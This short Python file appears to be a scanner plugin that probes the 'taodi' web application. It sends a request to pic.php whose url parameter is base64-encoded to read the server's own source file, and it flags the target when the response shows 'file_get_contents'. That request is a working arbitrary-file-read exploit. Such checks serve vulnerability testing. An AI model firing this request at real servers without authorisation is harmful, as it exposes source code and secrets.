#!/usr/bin/env python
import re

def assign(service, arg):
    if service == "taodi":
        return True, arg

def audit(arg):
    url = arg
    code, head, res, errcode, _ = curl.curl2(url + 'taodi/pic.php?url=cGljLnBocA==')
    if code == 200:
        m = re.search('file_get_contents', res)
        if m:
            security_info(m.group(0))

if __name__ == '__main__':
    from dummy import *
    audit(assign('taodi','http://127.0.0.1/')[1])
